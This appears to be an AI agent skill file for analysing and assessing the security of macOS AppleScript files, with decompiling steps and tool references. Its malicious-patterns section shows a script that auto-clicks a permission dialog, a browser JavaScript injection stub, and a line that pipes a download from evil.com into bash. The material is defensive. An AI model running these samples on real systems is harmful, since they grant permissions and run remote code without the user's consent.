---
name: macos-applescript-analyzer
description: Analyze and understand AppleScript files on macOS, including decompiling, disassembling, and security assessment. Use this skill whenever the user needs to examine .scpt files, understand AppleScript automation, investigate potential malware, or audit AppleScript usage on macOS systems. Make sure to use this skill when the user mentions AppleScript, .scpt files, macOS automation, process interaction scripts, or any macOS security investigation involving scripting.
---

# macOS AppleScript Analyzer

A skill for analyzing AppleScript files on macOS, understanding their behavior, and assessing security implications.

## What is AppleScript?

AppleScript is a scripting language used for task automation that can **interact with remote processes**. It makes it easy to ask other processes to perform actions, which can be abused by malware to:

- Inject arbitrary code into browser pages
- Auto-click permission dialogs (e.g., "Always Allow" buttons)
- Automate interactions with system processes

## When to Use This Skill

Use this skill when:
- You need to analyze a `.scpt` (compiled AppleScript) file
- You're investigating potential macOS malware
- You want to understand what an AppleScript does
- You're auditing AppleScript usage on a system
- You need to decompile or disassemble AppleScript files
- You're researching macOS security and privilege escalation

## Analysis Workflow

### Step 1: Identify the File Type

First, determine if the file is a compiled AppleScript:

```bash
file <script-file.scpt>
```

Expected output:
- `AppleScript compiled` - compiled script
- `AppleScript source` - plain text source

### Step 2: Attempt Decompile

For compiled scripts that aren't "read-only", try decompiling:

```bash
osadecompile <script-file.scpt>
```

This will output the AppleScript source code if the script wasn't exported as "Read only".

### Step 3: Analyze Read-Only Scripts

If `osadecompile` fails (script is "read-only"), use disassembly tools:

```bash
# Disassemble the compiled script
applescript-disassembler <script-file.scpt>

# Use aevt_decompile for deeper analysis
aevt_decompile <output-from-disassembler>
```

See [SentinelOne's research](https://labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/) for detailed methodology.

### Step 4: Security Assessment

Look for these suspicious patterns in AppleScript:

| Pattern | Risk | Example |
|---------|------|--------|
| Process interaction | High | `tell process "SecurityAgent"` |
| UI automation | High | `click button "Always Allow"` |
| Browser manipulation | High | `tell application "Safari"` |
| File system access | Medium | `do shell script` |
| Network operations | Medium | `do shell script "curl ..."` |

## Common Malicious Patterns

### Permission Dialog Auto-Click

```applescript
tell window 1 of process "SecurityAgent"
     click button "Always Allow" of group 1
end tell
```

This automatically grants permissions without user consent.

### Browser Code Injection

```applescript
tell application "Safari"
    tell document 1
        do JavaScript "malicious code here"
    end tell
end tell
```

### Shell Command Execution

```applescript
do shell script "/bin/bash -c 'curl http://evil.com/payload | bash'"
```

## Tools Reference

| Tool | Purpose | Link |
|------|---------|------|
| `osadecompile` | Decompile AppleScript | Built-in macOS |
| `applescript-disassembler` | Disassemble compiled scripts | [GitHub](https://github.com/Jinmo/applescript-disassembler) |
| `aevt_decompile` | Deep analysis of compiled scripts | [GitHub](https://github.com/SentineLabs/aevt_decompile) |

## Example Analysis

```bash
# Check file type
file suspicious.scpt
# Output: suspicious.scpt: AppleScript compiled

# Try decompile
osadecompile suspicious.scpt
# If this fails, the script is read-only

# Disassemble instead
applescript-disassembler suspicious.scpt > disassembly.txt

# Review the output for suspicious patterns
cat disassembly.txt | grep -i "click\|shell\|process"
```

## Security Recommendations

1. **Don't run unknown AppleScript files** - They can automate malicious actions
2. **Review TCC permissions** - Check which apps have automation access
3. **Monitor for suspicious patterns** - Look for process interaction and UI automation
4. **Use sandboxing** - Run untrusted scripts in isolated environments
5. **Keep tools updated** - Use latest versions of analysis tools

## Additional Resources

- [AppleScripts examples](https://github.com/abbeycode/AppleScripts)
- [SentinelOne: How offensive actors use AppleScript](https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/)
- [SentinelOne: Reversing malicious run-only AppleScripts](https://labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)

## Quick Commands

```bash
# List all .scpt files in current directory
find . -name "*.scpt" -type f

# Check file types
for f in *.scpt; do echo "$f:"; file "$f"; done

# Attempt to decompile all scripts
for f in *.scpt; do echo "=== $f ==="; osadecompile "$f" 2>&1; done
```

## Notes

- AppleScript files can be created in Script Editor (macOS)
- "Read only" export prevents decompilation but not disassembly
- Always analyze scripts in a safe environment before running
- Some scripts may require specific macOS versions or applications to function
